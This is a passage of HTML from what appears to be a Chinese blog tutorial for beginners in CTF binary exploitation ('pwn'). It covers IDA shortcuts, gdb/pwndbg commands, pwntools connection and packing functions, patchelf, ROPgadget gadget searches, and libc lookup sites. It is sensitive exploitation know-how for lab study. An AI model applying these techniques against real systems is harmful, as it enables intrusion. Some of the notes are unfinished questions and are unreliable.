src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303205201647.png\" alt=\"image-20230303205201647\"></p>\n<p>在设置里可以打开 auto comments 自动注释</p>\n<h3 id=\"视图文件操作\"><a href=\"#视图文件操作\" class=\"headerlink\" title=\"视图文件操作\"></a>视图文件操作</h3><p>选择Windows中的Reset Desktop返回默认 视图 </p>\n<p> 选择Windows中的Save Desktop保存这个 新视图</p>\n<p>配置文件吗??</p>\n<p>后退操作 esc</p>\n<p>前进操作 ctrl+enter</p>\n<h2 id=\"常用快捷键\"><a href=\"#常用快捷键\" class=\"headerlink\" title=\"常用快捷键:\"></a>常用快捷键:</h2><p>Table 切换视图</p>\n<p>快捷键</p>\n<p>p 在汇编中函数开头使用p,从当前地址处解析为函数</p>\n<p>u</p>\n<p>c 转换成代码</p>\n<h3 id=\"数据操作\"><a href=\"#数据操作\" class=\"headerlink\" title=\"数据操作:\"></a>数据操作:</h3><p>shift + f12 显示字符串string</p>\n<p>D – 设置数据 (Data)  1字节 2字节 4字节 8字节 进行循环 </p>\n<p>C – 设置代码 (Code) 设置为指令 </p>\n<p>A – 设置ASCII字符串 (ASCII)</p>\n<p>*设置数组 </p>\n<p>O – 设置地址偏移 (Offset) </p>\n<p>U – 取消定义 (Undefine) </p>\n<p>X – 交叉引用查找 (Cross-reference, Xref)</p>\n<h3 id=\"函数操作\"><a href=\"#函数操作\" class=\"headerlink\" title=\"函数操作\"></a>函数操作</h3><p>P – 创建函数 Del – 删除函数 Ctrl+E – 修改函数(函数窗口)</p>\n<p>Alt+P 修改函数(反汇编窗口)</p>\n<h3 id=\"伪代码操作\"><a href=\"#伪代码操作\" class=\"headerlink\" title=\"伪代码操作\"></a>伪代码操作</h3><p>N – 修改标识符名称 (Name) </p>\n<p>Y – 修改标识符类型 (tYpe) 比如int类型还是double还是什么</p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p>alt+t查找字符串</p>\n<p>a 转换成字符串</p>\n<p>d 分开的字符</p>\n<p>G跳转指定地址</p>\n<p>x 交叉引用 (函数和数据都有)</p>\n<p>: 加一条注释</p>\n<p>; 所有交叉引用都会回显这个注释</p>\n<h2 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h2><ul>\n<li><p>WORD (w)  16位 无符号数值 </p>\n</li>\n<li><p>DWORD (dw) 32位 无符号数值</p>\n</li>\n</ul>\n<h2 id=\"脚本编写\"><a href=\"#脚本编写\" class=\"headerlink\" title=\"脚本编写\"></a>脚本编写</h2><h1 id=\"动态分析-gdb-pwndbg插件\"><a href=\"#动态分析-gdb-pwndbg插件\" class=\"headerlink\" title=\"动态分析:gdb(pwndbg插件)\"></a>动态分析:gdb(pwndbg插件)</h1><p>There are a number of good gdb crash courses &#x2F; reference manuals:</p>\n<ul>\n<li><p><a href=\"https://sourceware.org/gdb/onlinedocs/gdb/index.html\">GDB’s documentation</a></p>\n</li>\n<li><p><a href=\"https://users.umiacs.umd.edu/~tdumitra/courses/ENEE757/Fall15/misc/gdb_tutorial.html\">Tudor’s gdb crash course</a></p>\n</li>\n<li><p><a href=\"https://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html\">gdb debugging full example</a></p>\n</li>\n<li><p><a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">pwndbg: a gdb extension (feature list)</a></p>\n</li>\n<li><p><a href=\"https://hugsy.github.io/gef/commands/aliases/\">gef: another gdb extension (feature list)</a></p>\n</li>\n<li><p>The course <a href=\"https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Dbg1012_GDB_1+2021_v1/course/\">Debuggers 1012: Introductory GDB</a> from OpenSecurityTraining2.</p>\n</li>\n</ul>\n<p>pwn.college <a href=\"https://www.youtube.com/watch?v=r185fCzdw8Y\">https://www.youtube.com/watch?v=r185fCzdw8Y</a></p>\n<p>pwndbg官方文档:<a href=\"https://browserpwndbg.readthedocs.io/en/docs/\">https://browserpwndbg.readthedocs.io/en/docs/</a></p>\n<p><a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md</a></p>\n<p>gdb官方文档:</p>\n<h3 id=\"调整\"><a href=\"#调整\" class=\"headerlink\" title=\"调整\"></a>调整</h3><p>把 stack 和 backtrace的行数减少,不然看不见上面的汇编了</p>\n<p>配置文件:<a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md</a></p>\n<p>修改配置文件就可以了</p>\n<p>找到pwndbg的下载目录的这个文件<a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a>&#x2F;<a href=\"https://github.com/pwndbg/pwndbg/tree/dev/pwndbg\">pwndbg</a>&#x2F;<a href=\"https://github.com/pwndbg/pwndbg/tree/dev/pwndbg/commands\">commands</a>&#x2F;<strong>context.py</strong> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">751行</span><br><span class=\"line\">stack_lines = pwndbg.gdblib.config.add_param(</span><br><span class=\"line\">    &quot;context-stack-lines&quot;, 8, &quot;number of lines to print in the stack context&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\">766行</span><br><span class=\"line\">backtrace_lines = pwndbg.gdblib.config.add_param(</span><br><span class=\"line\">    &quot;context-backtrace-lines&quot;, 8, &quot;number of lines to print in the backtrace context&quot;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"启动调试\"><a href=\"#启动调试\" class=\"headerlink\" title=\"启动调试\"></a>启动调试</h3><p>gdb filename</p>\n<p>gdb processName PID 或者 gdb -p <PID></PID></p>\n<p>添加参数 </p>\n<p>gdb -args .&#x2F;a.out a b c</p>\n<h3 id=\"断点相关\"><a href=\"#断点相关\" class=\"headerlink\" title=\"断点相关\"></a>断点相关</h3><p>b 函数名,如果有符号表的话可以,例如b gets</p>\n<p>b 地址  例如:b *0x3123213  这样打</p>\n<p>info b 查看断点信息</p>\n<p>delete n 删除n号断点</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>r 运行程序,会一直运行,直到比如需要输入什么东西等</p>\n<p>s 从头开始运行,断到第一行</p>\n<p>c 运行到下一个断点</p>\n<p>调试地址 就是 这个程序的基地址 + ida中的地址</p>\n<p>n 单步执行,(有函数的话直接跳过不进入)</p>\n<p>s 单步进入,有函数的话会进入</p>\n<p>finish 执行完当前函数,返回调用它的函数</p>\n<p>怎么查看自己当前在哪一行??和下面的代码??</p>\n<p>disass </p>\n<p>运行的时候 怎么 添加参数?</p>\n<h3 id=\"查看信息\"><a href=\"#查看信息\" class=\"headerlink\" title=\"查看信息\"></a>查看信息</h3><p>codebase 查看地址 (调试地址 就是 这个程序的基地址 + ida中的地址)</p>\n<p>vmmap查看内存映射mmap地址 信息</p>\n<p>teles 查看栈的信息</p>\n<p>p  变量名 查看变量地址</p>\n<p>info </p>\n<p>reg 查看寄存器信息</p>\n<p>dereference $esp 是啥??</p>\n<h4 id=\"查看内存信息\"><a href=\"#查看内存信息\" class=\"headerlink\" title=\"查看内存信息\"></a>查看内存信息</h4><p>使用examine命令（简写是x）来查看内存地址中的值</p>\n<p>x&#x2F;nuf <addr> 例如x &#x2F;20wx 0x0000000</addr></p>\n<p>n是个数,表示从当前地址往后显示的内存的长度,即显示几个地址的内容</p>\n<p>u表示,从当前地址往后请求的字节数,不指定的话默认4bytes,32位.b表示单字节，h表示双字节，w表示四字节，g表示八字节。</p>\n<p> f是显示的格式( i可以查看汇编代码)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20220929162158033.png\" alt=\"image-20220929162158033\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4b</span>x <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x80</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>hx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x8000</span>\t<span class=\"number\">0x0000</span>\t<span class=\"number\">0x0001</span>\t<span class=\"number\">0x0000</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>wx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x00008000</span>\t<span class=\"number\">0x00000001</span>\t<span class=\"number\">0x55554759</span>\t<span class=\"number\">0x00005555</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x7fffffffe490</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe490</span>:\t<span class=\"number\">0x0000000100008000</span>\t<span class=\"number\">0x0000555555554759</span></span><br><span class=\"line\"><span class=\"number\">0x7fffffffe4a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xa2698e7a0212c01a</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"堆相关\"><a href=\"#堆相关\" class=\"headerlink\" title=\"堆相关\"></a>堆相关</h3><p>heap 查看堆的信息</p>\n<p>heap bins 查看bins的信息</p>\n<p>heap chunks 查看chunk的信息</p>\n<p>Vis 查看堆内存</p>\n<h3 id=\"修改内存、寄存器等-方便调试\"><a href=\"#修改内存、寄存器等-方便调试\" class=\"headerlink\" title=\"修改内存、寄存器等 方便调试\"></a>修改内存、寄存器等 方便调试</h3><p>set $eip &#x3D; xxxx</p>\n<p>set {unsigned int}0x8048a51&#x3D;0x0</p>\n<p>find 内存搜索</p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>watch 监测点?</p>\n<p>canary</p>\n<p>q 退出</p>\n<p>display &#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令</p>\n<p>查看寄存器</p>\n<p>(gdb) i r (gdb) i r a # 查看所有<a href=\"https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020\">寄存器</a>（包括<a href=\"https://so.csdn.net/so/search?q=%E6%B5%AE%E7%82%B9&spm=1001.2101.3001.7020\">浮点</a>、多媒体） (gdb) i r esp (gdb) i r pc</p>\n<p>info reg</p>\n<p>eb address [data [data …]]</p>\n<h3 id=\"结构体相关\"><a href=\"#结构体相关\" class=\"headerlink\" title=\"结构体相关\"></a>结构体相关</h3><p>p 结构体名字</p>\n<p>p *(struct  xxx *) addr</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(DSI *) dsi</span><br><span class=\"line\">value of type `DSI<span class=\"number\">&#x27;</span> requires <span class=\"number\">67416</span> bytes, which is more than max-value-size</span><br><span class=\"line\">pwndbg&gt; p dsi</span><br><span class=\"line\">$<span class=\"number\">4</span> = (DSI *) <span class=\"number\">0x5555555b8960</span></span><br><span class=\"line\">pwndbg&gt; p *(DSI *) <span class=\"number\">0x5555555b8960</span></span><br><span class=\"line\">value of type `DSI<span class=\"number\">&#x27;</span> requires <span class=\"number\">67416</span> bytes, which is more than max-value-size</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"调试技巧\"><a href=\"#调试技巧\" class=\"headerlink\" title=\"调试技巧\"></a>调试技巧</h2><p>下好断点,然后多用c,在堆的调试中很好用</p>\n<p>pwntools中加input()</p>\n<p>gdb中怎么看文件描述符呢,有多少个,打开的  ll &#x2F;proc&#x2F;1562844&#x2F;fd 需要看进程信息</p>\n<p><a href=\"https://www.cnblogs.com/mfryf/p/5329770.html\">https://www.cnblogs.com/mfryf/p/5329770.html</a></p>\n<p>vmmap 查看内存分布</p>\n<h3 id=\"子进程调试\"><a href=\"#子进程调试\" class=\"headerlink\" title=\"子进程调试\"></a>子进程调试</h3><p><a href=\"https://blog.csdn.net/cjfeii/article/details/21647663\">https://blog.csdn.net/cjfeii/article/details/21647663</a></p>\n<p> <strong>set detach-on-fork off</strong></p>\n<p>有好几种模式</p>\n<p>info threads</p>\n<p>切换线程</p>\n<p> info inferiors</p>\n<p><a href=\"https://blog.csdn.net/bsp_mpu6050/article/details/107886383\">https://blog.csdn.net/bsp_mpu6050/article/details/107886383</a></p>\n<h1 id=\"脚本编写-pwntools\"><a href=\"#脚本编写-pwntools\" class=\"headerlink\" title=\"脚本编写:pwntools\"></a>脚本编写:pwntools</h1><p>官方文档:<a href=\"https://docs.pwntools.com/\">https://docs.pwntools.com</a></p>\n<p><a href=\"https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html\">https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/gdb.html</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.debug(io,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992/\">https://blog.csdn.net/fjh1997/article/details/105434992/</a></p>\n<h3 id=\"配合gdb\"><a href=\"#配合gdb\" class=\"headerlink\" title=\"配合gdb\"></a>配合gdb</h3><p>在输入一段数据后 断下,比如字符串的那个例子,我们想要查看刚刚输入完数据后的情况,</p>\n<p>第一种方法,找到断点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"number\">0x5655563b</span> &lt;fmtstr+<span class=\"number\">110</span>&gt;    push   <span class=\"number\">0x63</span></span><br><span class=\"line\">  <span class=\"number\">0x5655563d</span> &lt;fmtstr+<span class=\"number\">112</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br><span class=\"line\">► <span class=\"number\">0x56555640</span> &lt;fmtstr+<span class=\"number\">115</span>&gt;    push   eax</span><br><span class=\"line\">  <span class=\"number\">0x56555641</span> &lt;fmtstr+<span class=\"number\">116</span>&gt;    call   fgets@plt                    &lt;fgets@plt&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">0x56555646</span> &lt;fmtstr+<span class=\"number\">121</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\">  <span class=\"number\">0x56555649</span> &lt;fmtstr+<span class=\"number\">124</span>&gt;    sub    esp, <span class=\"number\">0xc</span></span><br><span class=\"line\">  <span class=\"number\">0x5655564c</span> &lt;fmtstr+<span class=\"number\">127</span>&gt;    lea    eax, [ebp - <span class=\"number\">0x70</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>attach的时候断到断点这里就好了,然后 gdb那边c, 然后pwntools这边执行一下(回车) 即可, 或者不用pause, 直接在gdb那c一下就行了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./vul32&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#io = process(&quot;./pwn3&quot;,&quot;b main&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;break *0x56555646&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.debug(&quot;./vul32&quot;,&quot;break main&quot;)</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;aaaaaa&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&#x27;Input:&#x27;,payload)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>__kernel_vsyscall+ 一上来的这个是什么?????????? 这是进入到了内核里面吧 可以通过backtrace来看</p>\n<p>#6  0xf7e4b29c in _IO_fgets</p>\n<p>#7  0x56555646 in fmtstr ()<br>#8  0x565556a5 in main ()<br>#9  0xf7dfdfa1 in __libc_start_main (main&#x3D;0x56<br>555685 <main>, argc&#x3D;1, argv</main></p>\n<p>确实是进入到断点后的位置</p>\n<p>右边c的时候,需要左边pwntools这边进行输入,右边不能进行输入的</p>\n<p>第二种,直接在开头就断点就好了</p>\n<h2 id=\"pwntools基础操作\"><a href=\"#pwntools基础操作\" class=\"headerlink\" title=\"pwntools基础操作\"></a>pwntools基础操作</h2><p>send和sendline的区别,send只是发送数据,sendline发送一行数据,也就是除了数据,还会加一个换行(回车)</p>\n<p><a href=\"https://blog.csdn.net/weixin_45556441/article/details/113982718\">https://blog.csdn.net/weixin_45556441/article/details/113982718</a></p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>apt-get install libffi-dev,libssl-dev</p>\n<p>pip install pwntools</p>\n<h3 id=\"环境变量设置\"><a href=\"#环境变量设置\" class=\"headerlink\" title=\"环境变量设置\"></a>环境变量设置</h3><p>​\t\t许多都是通过全局变量context进行设置的,例如操作系统,架构,字节序等</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context.os = <span class=\"string\">&#x27;linux&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span>  <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"连接及交互\"><a href=\"#连接及交互\" class=\"headerlink\" title=\"连接及交互\"></a>连接及交互</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file = process(<span class=\"string\">&quot;./pwn&quot;</span>)\t\t<span class=\"comment\">#本地文件         </span></span><br><span class=\"line\"></span><br><span class=\"line\">p= remote(<span class=\"string\">&quot;xx.xx.xx.xx&quot;</span>,<span class=\"number\">12345</span>)\t\t<span class=\"comment\">#远程\t\t</span></span><br><span class=\"line\">p.send(payload)    <span class=\"comment\">#发送数据</span></span><br><span class=\"line\">p.sendline(payload) <span class=\"comment\">#发送数据并添加换行符</span></span><br><span class=\"line\">p.senduntil?</span><br><span class=\"line\">p.sendafter(string)</span><br><span class=\"line\">p.sendlineafter()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv(count) <span class=\"comment\"># 接收count长度的信息</span></span><br><span class=\"line\">p.recvuntil(string,drop=<span class=\"literal\">True</span> <span class=\"keyword\">or</span> <span class=\"literal\">False</span>) <span class=\"comment\">#返回直到接收到指定字符串的信息,drop参数可以指定是否包含终止字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.clear() <span class=\"comment\"># 清空消息缓存</span></span><br><span class=\"line\">p.interactive() <span class=\"comment\"># 与程序进行交互</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"编码类\"><a href=\"#编码类\" class=\"headerlink\" title=\"编码类\"></a>编码类</h3><p>​\t\t漏洞利用时,payload可能有各种形式,8.16,32,64位、大端小端,pwntools提供了编码和解码的函数,p开头是编码,u开头是解码,后面跟着的是位数. 此外还提供了asm和disasm两个函数进行汇编和反汇编的转换</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p32(<span class=\"number\">0x8040000</span>)  <span class=\"string\">&#x27;\\x00\\x00\\x04\\x08&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">hex</span>(u32(<span class=\"string\">&#x27;\\x00\\x00\\x04\\x08&#x27;</span>))    <span class=\"string\">&#x27;0x8040000&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"文件信息获取类\"><a href=\"#文件信息获取类\" class=\"headerlink\" title=\"文件信息获取类\"></a>文件信息获取类</h3><p>​\t\t获取二进制文件或者libc等的got plt表地址,或者偏移等</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;bin-path&#x27;</span>) <span class=\"comment\">#加载二进制文件</span></span><br><span class=\"line\">elf.got[<span class=\"string\">&#x27;fun_name&#x27;</span>] <span class=\"comment\">#获取对应函数的got表地址</span></span><br><span class=\"line\">elf.plt[<span class=\"string\">&#x27;fun_name&#x27;</span>] <span class=\"comment\">#获取对应函数的plt表地址</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;libc-path&#x27;</span>) <span class=\"comment\">#加载二进制文件</span></span><br><span class=\"line\">libc.symbols[‘system’] <span class=\"comment\">#获取函数地址   </span></span><br><span class=\"line\">libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] 有什么区别??</span><br></pre></td></tr></table></figure>\n\n<p>symbols和got plt的关系???3</p>\n<h3 id=\"libc地址计算类\"><a href=\"#libc地址计算类\" class=\"headerlink\" title=\"libc地址计算类\"></a>libc地址计算类</h3><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><h3 id=\"shellcode\"><a href=\"#shellcode\" class=\"headerlink\" title=\"shellcode\"></a>shellcode</h3><p>Shellcraft.sh()</p>\n<h1 id=\"patchelf\"><a href=\"#patchelf\" class=\"headerlink\" title=\"patchelf\"></a>patchelf</h1><p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;a.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;a.out\t\t</p>\n<h1 id=\"gadget相关工具\"><a href=\"#gadget相关工具\" class=\"headerlink\" title=\"gadget相关工具\"></a>gadget相关工具</h1><h2 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h2><p>ROPgadget –binary rop  –only ‘pop|ret’ | grep ‘eax’   </p>\n<p>ROPgadget –binary ret2syscall  –only ‘int’</p>\n<p>ROPgadget –binary ret2syscall  –string ‘&#x2F;bin&#x2F;sh’</p>\n<h1 id=\"objdump\"><a href=\"#objdump\" class=\"headerlink\" title=\"objdump\"></a>objdump</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224643726.png\" alt=\"image-20230221224643726\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224632067.png\" alt=\"image-20230221224632067\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230221224616734.png\" alt=\"image-20230221224616734\"></p>\n<h1 id=\"libcsearch\"><a href=\"#libcsearch\" class=\"headerlink\" title=\"libcsearch\"></a>libcsearch</h1><p><a href=\"https://blog.csdn.net/qq_44108455/article/details/105458234\">https://blog.csdn.net/qq_44108455/article/details/105458234</a></p>\n<p><a href=\"https://blog.csdn.net/csdn546229768/article/details/121177641\">https://blog.csdn.net/csdn546229768/article/details/121177641</a></p>\n<p>apt get install zstd</p>\n<h2 id=\"在线搜索libc-libc-database-search\"><a href=\"#在线搜索libc-libc-database-search\" class=\"headerlink\" title=\"在线搜索libc libc database search\"></a>在线搜索libc libc database search</h2><p><a href=\"https://libc.blukat.me/\">https://libc.blukat.me</a></p>\n<p><a href=\"https://libc.rip/\">https://libc.rip</a></p>\n<p><a href=\"https://github.com/niklasb/libc-database\">https://github.com/niklasb/libc-database</a></p>\n<p><a href=\"https://github.com/lieanu/LibcSearcher\">https://github.com/lieanu/LibcSearcher</a></p>\n<h1 id=\"Linux自带工具\"><a href=\"#Linux自带工具\" class=\"headerlink\" title=\"Linux自带工具\"></a>Linux自带工具</h1><h1 id=\"file\"><a href=\"#file\" class=\"headerlink\" 